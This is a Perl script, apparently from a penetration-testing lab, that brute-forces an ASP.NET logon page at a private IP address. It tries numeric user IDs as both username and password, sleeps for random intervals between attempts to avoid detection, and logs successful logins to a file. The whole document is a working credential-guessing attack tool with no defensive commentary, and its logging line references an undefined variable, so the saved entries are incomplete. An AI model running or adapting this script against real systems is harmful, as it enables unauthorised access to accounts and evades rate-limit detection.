#!perl
use HTTP::Headers;
use HTTP::Request;
use LWP;

my $url = 'http://10.11.1.144/PRD/Html/SystemDocs/Logon.aspx';

my $ua = LWP::UserAgent->new;
my $request = HTTP::Request->new(
    POST                =>  $url,
    HTTP::Headers->new(
        'User-Agent'        =>  'Opera/9.64 (Windows NT 5.1; U; en) Presto/2.1.1',
        'Accept-Language'   =>  'en-US,en',
        'Accept-Charset'    =>  'iso-8859-1, utf-8, utf-16, *',
        'Accept-Encoding'   =>  'deflate, gzip',
        'Accept'            =>  'text/html, application/xml, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*',
        'Content-Type'      =>  'application/x-www-form-urlencoded',
    ),
);

my $user = 253;

my @sleep = qw( 7 5 12 8 11 3 10 15 9 );


my $s;
while ( 1 ) {

    print "User: $user...";

    if ( my $answer = &login( $user ) ) {

        if ( $answer == 1 ) {

            print "Successful";
            open( A, ">>pw_list.txt");
            print A $user . ":" . $pass . "\n";
            close A;

        } elsif ( $answer == -1 ) {

            print "HTTP request failed\n";
            last;
        }

    } else {

        print "Invalid";
    }

    print "\n";

    if ( $user >= 300 ) {
        last;
    }

    $s = $sleep[ int( rand( $#sleep + 1 ) ) ];
    print "Sleep $s\n";
    sleep ( $s );

    $user++;
}

print "Finished\n";
exit;

sub login
{
    my $u = shift;

    $request->content( "UserName=$u&Password=$u" );
    my $response = $ua->request( $request );

    if ( $response->status_line eq '200 OK' || $response->status_line eq '302 Found' ) {

        #print "Headers:\n" . $response->headers_as_string . "\n\n";
        #print "Content:\n" . $response->content . "\n\n";
        if ( $response->content =~ /Logon failed/i ) {

            return undef;
        }

        return 1;
    } else {

        print "HTTP request unsuccessful: " . $response->status_line . "\n";
        return -1;
    }

}

